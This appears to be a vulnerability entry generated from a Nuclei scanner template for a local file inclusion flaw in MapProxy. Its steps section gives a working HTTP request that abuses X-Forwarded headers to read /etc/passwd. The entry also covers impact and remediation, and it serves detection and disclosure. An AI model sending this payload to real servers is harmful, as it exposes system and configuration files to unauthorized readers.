# Nuclei Template: MapProxy - Local File Inclusion
**Template ID:** mapproxy-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`mapproxy-file-read.yaml`)

## Vulnerability Information & PoC

## Description
MapProxy improperly validates and processes X-Forwarded headers, allowing attackers to construct file:// URLs that bypass access controls and read local files through local file inclusion vulnerability.

## Impact
An attacker can exploit this vulnerability to read sensitive local files like /etc/passwd, configuration files, and other system files, potentially exposing sensitive information.

## Steps to reproduce / Exploit Payload
```http
GET {{path}}?wms_capabilities&type=external HTTP/1.1
Host: {{Hostname}}
X-Forwarded-Proto: file
X-Forwarded-Host: ///etc/passwd#.xml
```

## Remediation
Update MapProxy to a patched version that properly validates X-Forwarded headers and restricts file:// URL schemes in proxy configurations.

## References
- https://github.com/mapproxy/mapproxy
- https://mapproxy.org
